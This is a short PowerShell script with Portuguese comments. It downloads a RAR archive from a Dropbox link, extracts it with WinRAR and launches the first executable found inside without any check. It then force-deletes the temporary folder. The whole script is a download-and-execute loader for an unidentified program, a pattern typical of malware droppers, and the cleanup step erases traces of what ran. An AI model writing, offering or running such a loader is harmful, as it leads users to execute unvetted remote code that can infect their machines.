# Função para verificar se o WinRAR está instalado
function Test-WinRAR {
    $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
    return Test-Path $winrarPath
}

# Função para extrair arquivo RAR
function Extract-RAR {
    param (
        [string]$rarPath,
        [string]$destination
    )
    
    if (Test-WinRAR) {
        $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
        Start-Process -FilePath $winrarPath -ArgumentList "x", "-y", $rarPath, $destination -Wait
        return $true
    }
    return $false
}

# Cria pasta temporária
$tempFolder = Join-Path $env:TEMP "sv_temp"
New-Item -ItemType Directory -Force -Path $tempFolder | Out-Null

try {
    # Download do arquivo
    Write-Host "Baixando arquivo..." -ForegroundColor Yellow
    $url = "https://www.dropbox.com/scl/fi/jave5rw3bbj755ss5c900/servidor-download.rar?dl=1"
    $outputPath = Join-Path $tempFolder "programa.rar"
    
    Invoke-WebRequest -Uri $url -OutFile $outputPath
    Write-Host "Download concluído!" -ForegroundColor Green
    
    # Tenta extrair com WinRAR
    Write-Host "Extraindo arquivo..." -ForegroundColor Yellow
    $extractPath = Join-Path $tempFolder "extracted"
    New-Item -ItemType Directory -Force -Path $extractPath | Out-Null
    
    if (Extract-RAR -rarPath $outputPath -destination $extractPath) {
        # Procura por executáveis na pasta extraída
        $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse
        if ($exeFiles.Count -gt 0) {
            Write-Host "Executando programa..." -ForegroundColor Green
            Start-Process $exeFiles[0].FullName
        } else {
            Write-Host "Nenhum executável encontrado na pasta extraída." -ForegroundColor Red
        }
    } else {
        Write-Host "WinRAR não encontrado. Por favor, instale o WinRAR para continuar." -ForegroundColor Red
        # Abre a página de download do WinRAR
        Start-Process "https://www.win-rar.com/download.html"
    }
    
} catch {
    Write-Host "Erro durante o processo: $_" -ForegroundColor Red
} finally {
    # Aguarda um pouco antes de limpar
    Start-Sleep -Seconds 5
    # Limpa arquivos temporários
    Remove-Item -Path $tempFolder -Recurse -Force -ErrorAction SilentlyContinue
} 
